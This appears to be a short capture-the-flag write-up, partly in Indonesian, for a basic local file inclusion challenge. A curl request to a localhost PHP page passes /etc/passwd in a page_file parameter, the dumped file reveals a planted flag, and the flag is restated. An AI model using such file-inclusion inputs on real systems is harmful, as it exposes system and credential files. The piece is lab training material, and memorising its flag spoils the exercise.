<h1><b>Change Directory</h1></b>
<pre>
Change Directory
</pre>
</b><h3>Solution</h3></b>
<p>Basic LFI(Local file inclusion), enter /etc/passwd pada form input dan submit lalu cari flag pada list</p>

```console
root@Python:/home/venom/Downloads# curl http://localhost/CTF/Web_warning/Web-Warning-6.php?page_file=/etc/passwd&Submit=Submit | grep -i flag
[1] 14218
root@Python:/home/venom/Downloads# <!DOCTYPE html>
<html>
<head>
	<title>Web Warning-6</title>
	<link rel="stylesheet" type="text/css" href="most_template.css" media="all" />
</head>
<body align='center'>
<form method="GET">
	<p>Basic LFI</p>
	<input type="text" name="page_file" placeholder="Page">
	<input type="Submit" name="Submit">
</form>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
_apt:x:102:65534::/nonexistent:/usr/sbin/nologin
mysql:x:103:107:MySQL Server,,,:/nonexistent:/bin/false
epmd:x:104:108::/var/run/epmd:/usr/sbin/nologin
Debian-exim:x:105:109::/var/spool/exim4:/usr/sbin/nologin
uuidd:x:106:111::/run/uuidd:/usr/sbin/nologin
rwhod:x:107:65534::/var/spool/rwho:/usr/sbin/nologin
redsocks:x:108:112::/var/run/redsocks:/usr/sbin/nologin
usbmux:x:109:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
miredo:x:110:65534::/var/run/miredo:/usr/sbin/nologin
stunnel4:x:113:116::/var/run/stunnel4:/usr/sbin/nologin
rtkit:x:114:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
postgres:x:115:118:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
dnsmasq:x:116:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
messagebus:x:117:119::/nonexistent:/usr/sbin/nologin
iodine:x:118:65534::/var/run/iodine:/usr/sbin/nologin
arpwatch:x:119:121:ARP Watcher,,,:/var/lib/arpwatch:/bin/sh
sslh:x:120:125::/nonexistent:/usr/sbin/nologin
gluster:x:121:127::/var/lib/glusterd:/usr/sbin/nologin
couchdb:x:122:128:CouchDB Administrator,,,:/var/lib/couchdb:/bin/bash
geoclue:x:123:131::/var/lib/geoclue:/usr/sbin/nologin
colord:x:125:132:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
saned:x:126:134::/var/lib/saned:/usr/sbin/nologin
speech-dispatcher:x:127:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:128:135:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
Debian-gdm:x:130:138:Gnome Display Manager:/var/lib/gdm3:/bin/false
king-phisher:x:131:139::/var/lib/king-phisher:/usr/sbin/nologin
dradis:x:132:140::/var/lib/dradis:/usr/sbin/nologin
beef-xss:x:133:141::/var/lib/beef-xss:/usr/sbin/nologin
venom:x:1000:1000:Venom,,,:/home/venom:/bin/bash
systemd-timesync:x:111:113:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
tss:x:134:144:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:135:145::/nonexistent:/usr/sbin/nologin
Your:Flag:is:VenomCTF{w3ak_1n_1nclude_d1r3ctoriii}
_rpc:x:136:65534::/run/rpcbind:/usr/sbin/nologin
Debian-snmp:x:137:146::/var/lib/snmp:/bin/false
statd:x:138:65534::/var/lib/nfs:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
nvpd:x:139:148:NVIDIA Persistence Daemon,,,:/var/run/nvpd/:/usr/sbin/nologin
pulse:x:129:136:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
proftpd:x:141:65534::/run/proftpd:/usr/sbin/nologin
telnetd:x:142:152::/nonexistent:/usr/sbin/nologin
sshd:x:124:65534::/run/sshd:/usr/sbin/nologin
bind:x:140:150::/var/cache/bind:/usr/sbin/nologin
postfix:x:144:153::/var/spool/postfix:/usr/sbin/nologin
ntp:x:112:114::/nonexistent:/usr/sbin/nologin
ftp:x:143:151:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
</body>
</html>
```
</b><h3>Flag</h3></b>
<pre>
VenomCTF{w3ak_1n_1nclude_d1r3ctoriii}
</pre>
